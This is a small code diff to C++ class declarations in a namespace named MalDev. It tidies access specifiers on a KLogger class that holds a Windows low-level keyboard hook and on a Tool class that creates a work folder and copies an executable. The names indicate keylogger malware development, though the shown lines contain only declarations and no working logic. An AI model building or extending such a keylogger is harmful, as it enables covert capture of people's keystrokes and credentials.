@@ -11,6 +11,7 @@ namespace MalDev
 {
 	class KLogger
 	{
+	private:
 		static string filename;
 		static HHOOK hook;
 		static KBDLLHOOKSTRUCT kbStruct;
@@ -35,7 +36,6 @@ namespace MalDev
 
 	class Tool
 	{
-	private:
 	public:
 		bool CreateWorkFolder(string workfolder, bool showfolder);
 		bool CopyExeFile(string OrigExe, string CopyExe);
